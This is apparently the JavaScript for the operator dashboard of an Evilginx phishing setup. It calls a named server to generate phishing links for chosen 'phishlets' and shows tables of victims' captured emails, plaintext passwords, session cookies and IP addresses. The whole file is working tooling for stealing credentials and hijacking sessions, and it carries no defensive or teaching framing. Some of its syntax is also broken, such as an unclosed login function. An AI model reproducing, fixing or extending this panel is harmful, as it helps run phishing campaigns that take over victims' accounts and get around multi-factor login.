console.log("✅ script.js loaded successfully");

// Set Evilginx API server URL (include port 8443 because Nginx is listening on that port)
const EVILGINX_SERVER = "https://tecan.com.co:8443";

// CORS settings to allow requests from the frontend
const CORS_HEADERS = {
  "Content-Type": "application/json",
  "Access-Control-Allow-Origin": "https://panel-auth-134b7.web.app",
  "Access-Control-Allow-Credentials": "true",
  "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type, Authorization"
};

// Wait for Firebase to load before executing functions
document.addEventListener("DOMContentLoaded", function () {
  if (typeof firebase === "undefined") {
    console.error("❌ Firebase is NOT defined. Check firebase-config.js.");
    return;
  }
  checkAuthStatus();

  // Attach event listeners for login/logout if present
  document.getElementById("loginBtn")?.addEventListener("click", login);
  document.getElementById("logoutBtn")?.addEventListener("click", logout);
});

// Check authentication status
function checkAuthStatus() {
  firebase.auth().onAuthStateChanged(function (user) {
    if (user) {
      console.log("✅ User logged in:", user.email);
      if (window.location.pathname.endsWith("index.html") || window.location.pathname === "/") {
        window.location.href = "dashboard.html";
      }
    } else {
      console.log("❌ User not logged in.");
      if (window.location.pathname.includes("dashboard")) {
        window.location.href = "index.html";
      }
    }
  });
}

// Login function
function login() {
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;
  if (!email || !password) {
    alert("Please enter email and password.");
    return;
  }
  firebase.auth().signInWithEmailAndPassword(email, password)
    .then((userCredential) => {
      console.log("✅ Login successful:", userCredential.user.email);
      window.location.href = "dashboard.html";
    })
    .catch((error) => {
      console.error("❌ Login failed:", error.message);
      document.getElementById("loginError").innerText = error.message;
    });

// Logout function
function logout() {
  firebase.auth().signOut()
    .then(() => {
      console.log("✅ User logged out.");
      window.location.href = "index.html";
    })
    .catch((error) => {
      console.error("❌ Logout failed:", error.message);
    });
}

// Generate phishing link for a specific phishlet
function generatePhishletLink(phishlet) {
    console.log(`🔄 Fetching preconfigured link for phishlet: ${phishlet}`);
    fetch(`${EVILGINX_SERVER}/generate_link?phishlet=${encodeURIComponent(phishlet)}`, {
        method: "GET",
        mode: "cors",
        credentials: "include",
        headers: {
            "Content-Type": "application/json"
        }
    })
    .then(response => {
        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }
        return response.json();
    })
    .then(data => {
        if (data.link) {
            console.log(`✅ Successfully fetched link for ${phishlet}:`, data.link);
            document.getElementById("phishletLink").innerHTML = 
                `Generated Link: <a href="${data.link}" target="_blank">${data.link}</a>`;
        } else {
            throw new Error("Failed to fetch link.");
        }
    })
    .catch(error => {
        console.error("❌ Error fetching link:", error);
        alert("Error fetching link: " + error.message);
    });

  }

                                                                                                                                           // Fetch generated links history and update the table with id "generatedLinks"
async function viewGeneratedLinks() {
  console.log("🔄 Fetching generated links history...");
  try {
    const response = await fetch(`${EVILGINX_SERVER}/generated_links_history`, {
      method: "GET",
      headers: CORS_HEADERS
    });
    if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
    const data = await response.json();
    const tableBody = document.getElementById("generatedLinks");
    if (!tableBody) {
      console.error("Element with id 'generatedLinks' not found.");
      return;
    }
    tableBody.innerHTML = "";
    if (data.length === 0) {
      tableBody.innerHTML = "<tr><td colspan='4'>No generated links found.</td></tr>";
    } else {
      data.forEach(record => {
        tableBody.innerHTML += `<tr>
                                  <td>${record.phishlet}</td>
                                  <td><a href="${record.link}" target="_blank">${record.link}</a></td>
                                  <td>${record.timestamp}</td>
                                  <td>${record.ip}</td>
                                </tr>`;
      });
    }
    console.log("✅ Generated links updated successfully.");
  } catch (error) {
    console.error("❌ Error fetching generated links:", error);
    alert("Failed to load generated links: " + error.message);
  }
}

// Fetch captured sessions and update the table with id "capturedSessions"
async function viewCapturedSessions() {
  console.log("🔄 Fetching captured sessions...");
  try {
    const response = await fetch(`${EVILGINX_SERVER}/captured_sessions`, {
      method: "GET",
      headers: CORS_HEADERS
    });
    if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
    const data = await response.json();
    const tableBody = document.getElementById("capturedSessions");
    if (!tableBody) {
      console.error("Element with id 'capturedSessions' not found.");
      return;
    }
    tableBody.innerHTML = "";
    if (data.length === 0) {
      tableBody.innerHTML = "<tr><td colspan='5'>No captured sessions found.</td></tr>";
    } else {
      data.forEach(session => {
        tableBody.innerHTML += `<tr>
                                  <td>${session.email}</td>
                                  <td>${session.password}</td>
                                  <td>${session.cookies}</td>
                                  <td>${session.ip}</td>
                                  <td>${session.timestamp}</td>
                                </tr>`;
      });
    }
    console.log("✅ Captured sessions updated successfully.");
  } catch (error) {
    console.error("❌ Error fetching captured sessions:", error);
    alert("Failed to load captured sessions: " + error.message);
  }
}

// Fetch captured cookies and update the table with id "cookies"
async function viewCookies() {
  console.log("🔄 Fetching captured cookies...");
  try {
    const response = await fetch(`${EVILGINX_SERVER}/cookies`, {
      method: "GET",
      headers: CORS_HEADERS
    });
    if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
    const data = await response.json();
    const tableBody = document.getElementById("cookies");
    if (!tableBody) {
      console.error("Element with id 'cookies' not found.");
      return;
    }
    tableBody.innerHTML = "";
    if (data.length === 0) {
      tableBody.innerHTML = "<tr><td colspan='4'>No cookies captured.</td></tr>";
    } else {
      data.forEach(item => {
        tableBody.innerHTML += `<tr>
                                  <td>${item.email}</td>
                                  <td>${item.cookies}</td>
                                  <td>${item.timestamp}</td>
                                  <td>${item.ip}</td>
                                </tr>`;
      });
    }
    console.log("✅ Cookies updated successfully.");
  } catch (error) {
    console.error("❌ Error fetching cookies:", error);
    alert("Failed to load cookies: " + error.message);
  }
)
